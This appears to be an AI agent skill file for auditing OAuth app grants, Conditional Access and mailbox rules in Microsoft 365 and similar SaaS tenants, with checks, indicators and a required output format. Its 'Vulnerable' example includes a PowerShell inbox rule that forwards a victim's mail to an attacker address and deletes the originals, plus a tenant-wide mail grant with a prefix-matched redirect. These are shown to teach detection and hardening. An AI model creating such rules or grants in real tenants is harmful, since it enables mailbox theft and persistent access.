---
name: saas-oauth-app-and-m365-workspace-security
description: "Assesses enterprise SaaS tenants (Microsoft 365, Google Workspace, Okta, Slack, GitHub Enterprise): over-privileged third-party OAuth app grants, domain-wide delegation, Conditional Access policy exclusions, legacy authentication protocols, and mailbox/audit forwarding rules. Use when auditing SaaS posture."
family: cloud-container-supply-chain
tier: core
triggers: ["m365 security assessment", "google workspace oauth audit", "okta policy review", "oauth app consent audit"]
cwe: [CWE-269, CWE-287]
owasp: []
attack: []
capec: []
related: [cloud-recon-and-enumeration, aws-attacks, azure-and-entra-attacks, gcp-attacks]
corpus_sparse: true
---

# Saas Oauth App and M365 Workspace Security - Red Team Sub-Skill

> **Cyber Monster** | Family: [`Cloud, Container and Supply Chain`](../README.md) | Tier: **core** | Paired Counterpart: [`cloud-detection-and-logging`](../../../blue-team/detection-and-monitoring/cloud-detection-and-logging/SKILL.md)
> **Grounding note:** fewer than three corpus records matched this exact leaf (`corpus_sparse: true`). Guidance below is compiled from authoritative CWE/OWASP/ATT&CK specifications and verified engineering blueprints.

## Mechanism and Preconditions

SaaS and workspace review is the OAuth grant problem plus the mailbox problem. The grant: an application in a tenant holds either delegated permissions (acting as a signed-in user, backed by a refresh token) or application permissions (acting as itself, with no user involved), and the grant object — `appRoleAssignment` for application permissions, `oauth2PermissionGrant` for delegated ones — is what actually confers access. A grant persists after the consenting user leaves, and `consentType: AllPrincipals` makes it tenant-wide. RFC 9700 codifies the current best practice for the flows that carry these grants: PKCE for every authorization-code flow, exact redirect-URI matching, no implicit or password grants, and sender-constrained tokens (DPoP or mTLS) where the deployment supports them; RFC 9728 adds protected-resource metadata so a client can discover which authorization server and scopes apply instead of guessing. The mailbox half is separate and harder to fix: a mailbox rule that forwards externally, a delegate with full-access permission, an SMTP AUTH credential, or an eDiscovery hold change are all workspace-level findings with no OAuth involvement at all, and they are the persistence mechanism in most business-email-compromise cases.

## Quick Start

Follow these **IF / THEN** decision rules before reading any companion file:

1. **IF** the finding is an OAuth grant **THEN** read the grant object, not the app manifest; the manifest is a request and the grant is the access.
2. **IF** the grant is delegated with `offline_access` **THEN** it is backed by a refresh token, so revocation is the only complete remedy.
3. **IF** the concern is a mailbox rule or delegate **THEN** the branch is workspace configuration, and OAuth analysis does not apply.
4. **IF** the client uses the implicit grant or a password grant **THEN** RFC 9700 deprecates both, and the finding cites the flow rather than a code line.
5. **IF** a redirect URI matches only by prefix or allows a wildcard host **THEN** the finding is redirect-URI matching, which is the token-theft path.
6. **IF** the tenant has no consent policy and allows user consent broadly **THEN** the enabling condition is the policy, and the grant is the symptom.
7. **IF** the grant is on a mailbox rather than an application **THEN** the branch is workspace configuration and the Exchange audit log is the evidence.
8. **IF** the question is what credentials are in the estate rather than what grants exist **THEN** start at [`secrets-hunting-and-source-leak`](../secrets-hunting-and-source-leak/SKILL.md) for the credential inventory.
9. **IF** every grant is application-scoped to a narrow role, the flows use PKCE with exact redirects, and mailbox forwarding rules are inventoried **THEN** record `Verified Safe` with all three artefacts.

## Variants and Decision Table

| Condition / Need | Target File | Why |
|---|---|---|
| Need extra diagnostic checks or SIEM queries | [`PAYLOADS.md`](PAYLOADS.md) | Open only if inline patterns below are insufficient |
| Need CLI syntax, flags, and SDK reference | [`TOOLS.md`](TOOLS.md) | Open when invoking or scripting external tools |
| Need real-world case cards & root causes | [`SCENARIOS.md`](SCENARIOS.md) | Distilled incidents from disclosed reports & corpora |
| Need detection signals | [`DETECTION.md`](DETECTION.md) | Operational handoff & telemetry scope |
| Need in-file case notes | [`CASES.md`](CASES.md) | Labels already in this folder; the procedure is in this SKILL.md |

## Procedure

1. **Classify the access mechanism.** Delegated grant, application grant, mailbox configuration, or a token obtained outside OAuth. Each has a different evidence source and a different remedy.
2. **Read the grant objects with their scope and consent type.** `oauth2PermissionGrants` for delegated, `appRoleAssignments` on the service principal for application. The scope string or role name is the exposure.
3. **Check the OAuth client's flow against RFC 9700.** PKCE present, redirect URIs exact, no implicit or password grant, and token binding where supported. These are checkable from configuration and from the authorize request.
4. **Define the baseline-vs-probe differential.** Baseline: the grant list and the consent policy before the review window. Probe: the same now. A new grant, or a widened scope on an existing one, is the finding; the policy determines whether it needed approval.
5. **Name the stop condition.** Stop at the first grant whose scope exceeds the stated purpose, or the first mailbox rule that forwards externally. Do not exercise the grant.
6. **State the proof.** Report the grant object id, the client, the scope or role, the consent type, the consenting principal, and the policy that should have gated it. For a mailbox finding, report the rule's target and its creation time.

## Concrete Patterns

| Indicator | What it proves | Stack / surface |
|---|---|---|
| An `oauth2PermissionGrant` with `Mail.Read` and `consentType: AllPrincipals` | Every mailbox readable by the application on behalf of every user | Microsoft Graph, Exchange Online |
| An `appRoleAssignment` for `Files.ReadWrite.All` | Application-level write to every drive, with no user involved | Entra app registrations |
| An authorize request without `code_challenge` | No PKCE, so an intercepted code is redeemable — deprecated by RFC 9700 | OAuth clients |
| A redirect URI of `https://app.example.com/callback*` | Prefix matching admits a path the attacker can influence; exact matching is required | App registration redirect URIs |
| An inbox rule with `redirectTo` an external address | Mailbox exfiltration with no OAuth involvement | Exchange Online mailbox rules |
| A delegate with `FullAccess` on a shared mailbox | Full read and send as another identity, which persists after the delegation is forgotten | Exchange Online permissions |

## Worked Contrast

**Vulnerable: tenant-wide mail grant, no PKCE, prefix-matching redirect, external forwarding rule**

```text
# Tenant-wide delegated mail access, granted once and backed by refresh tokens.
POST https://graph.microsoft.com/v1.0/oauth2PermissionGrants
{ "clientId": "$APP", "consentType": "AllPrincipals",
  "resourceId": "$GRAPH", "scope": "offline_access Mail.Read Mail.Send" }

# Authorize request with no PKCE and a prefix-matched redirect.
GET /authorize?client_id=$APP&response_type=code&scope=Mail.Read
    &redirect_uri=https://app.example.com/callback*
```

```powershell
# Mailbox rule forwarding everything externally, invisible to OAuth review.
New-InboxRule -Mailbox victim@example.com -Name "sync" `
  -ForwardTo attacker@example.net -DeleteMessage $true
```

**Hardened: per-principal least-scope grant, PKCE with exact redirect, no external forwarding**

```text
POST https://graph.microsoft.com/v1.0/oauth2PermissionGrants
{ "clientId": "$APP", "consentType": "Principal", "principalId": "$PILOT_GROUP",
  "resourceId": "$GRAPH", "scope": "Mail.Read" }

GET /authorize?client_id=$APP&response_type=code&scope=Mail.Read
    &redirect_uri=https://app.example.com/callback
    &code_challenge=$S256&code_challenge_method=S256
```

```powershell
# Transport rule blocking external auto-forward at the tenant scope.
New-TransportRule -Name "BlockExternalAutoForward" -SentToScope NotInOrganization `
  -MessageTypeMatches AutoForward -BlockMessage $true
```

**Why this matters:** The left state gives an application persistent tenant-wide mail access with no PKCE and a redirect that admits path confusion, and the mailbox rule gives the same attacker a second, OAuth-free path that survives revoking the grant. The right state limits the grant to a pilot group and one scope, requires PKCE with an exact redirect, and blocks external auto-forward at the tenant so the mailbox path is closed independently.

## When It Is NOT This Issue

- **An `AllPrincipals` grant for `openid profile User.Read`.** The baseline sign-in scopes; every application needs them.
- **A mailbox rule that forwards to an internal address the user configured.** Internal forwarding is a workflow, not exfiltration; check the destination domain.
- **A redirect URI with a trailing-slash difference.** RFC 9700 requires exact matching of the registered string; a trailing slash registered explicitly is fine.
- **A password grant in a legacy internal tool with a documented migration date.** The finding is the date; report the risk with the plan.
- **An application permission granted to a first-party Microsoft service.** Not a customer over-grant.

## Anti-Hallucination Ban List

- **NEVER fabricate CVE identifiers, CVSS vector strings, or vendor advisory URLs** — you MAY cite standard CWE/OWASP/ATT&CK IDs when accurate, but cite specific CVEs only from user input or `CASES.md`.
- **NEVER claim `saas-oauth-app-and-m365-workspace-security` is exploitable from a string match or HTTP 500 error alone** without verifying reachability and control-vs-probe differential.
- **NEVER generate weaponized exploit payloads, shellcode, C2/implant code, or destructive commands** — prove issues with minimal non-destructive checks and structural fixes.
- **NEVER recommend blocklist filtering as a primary remediation** when typed schemas, bound parameters, or server-side allowlists exist.

## Preconditions Checklist

Verify all five checks before emitting your final output:

- [ ] **Preconditions verified:** Every required boundary/sink/logsource for `saas-oauth-app-and-m365-workspace-security` was confirmed in the input, not assumed.
- [ ] **False-positive traps ruled out:** None of the negative conditions in *When It Is NOT This Issue* apply.
- [ ] **Zero fabricated citations:** Every CVE, CWE, CLI flag, or API name is verbatim from the user input or this skill.
- [ ] **Concrete remediation / action:** Fix, rule, or script is specific and actionable (no generic 'sanitize inputs' advice).
- [ ] **Output Contract followed:** Response uses the exact headings in *Strict Output Contract* below.

## Strict Output Contract

Use this structure for your answer unless the user explicitly asks for a different format:

```markdown
### Security Assessment Finding: saas-oauth-app-and-m365-workspace-security
- **Verdict & Confidence**: [Confirmed Vulnerable | Non-Exploitable / False Positive | Needs Runtime Verification] (Confidence: High/Medium/Low)
- **Preconditions & Surface**: [Entry point, trust boundary, and exact sink/config reached]
- **Verified Evidence**: [Minimal non-destructive check vs baseline, or exact vulnerable lines]
- **Root Cause & Taxonomy**: [Broken security invariant; CWE: CWE-269, CWE-287 | Mapping: Domain Invariant]
- **Concrete Remediation**: [Idiomatic code diff or configuration change + verification test]
```

## Related Sub-Skills

- [`cloud-detection-and-logging`](../../../blue-team/detection-and-monitoring/cloud-detection-and-logging/SKILL.md) - Blue Detection/Defense Counterpart
- [`cloud-recon-and-enumeration`](../cloud-recon-and-enumeration/SKILL.md) - Cloud, Container and Supply Chain (core)
- [`aws-attacks`](../aws-attacks/SKILL.md) - Cloud, Container and Supply Chain (flagship)
- [`azure-and-entra-attacks`](../azure-and-entra-attacks/SKILL.md) - Cloud, Container and Supply Chain (core)
- [`gcp-attacks`](../gcp-attacks/SKILL.md) - Cloud, Container and Supply Chain (core)
- [`cloud-iam-privilege-escalation`](../cloud-iam-privilege-escalation/SKILL.md) - Cloud, Container and Supply Chain (core)

## Operating Notes

- **Self-contained 1-read design:** This `SKILL.md` handles ~80% of `saas-oauth-app-and-m365-workspace-security` tasks directly; only open companions when a row in *Variants and Decision Table* applies.
- **Taxonomy framing:** Keep framework references concise (parent CWE/ATT&CK categories `CWE-269, CWE-287`).
- **Safety & authorization:** Perform only non-destructive verification and defensible engineering within authorized scope.

## Evidence Base

| Dimension | Value |
|---|---|
| Corpus records | 1 |
| Distinct dataset sources | 1 |
| Top sources | CYBER_CPT/hacktricks_cloud (1) |
| Worked contrasts & slot items | 1 inline worked contrast + 0 code / 0 det / 0 tools / 1 cases |
| Grounding | reference frameworks & engineering blueprint (corpus_sparse) |
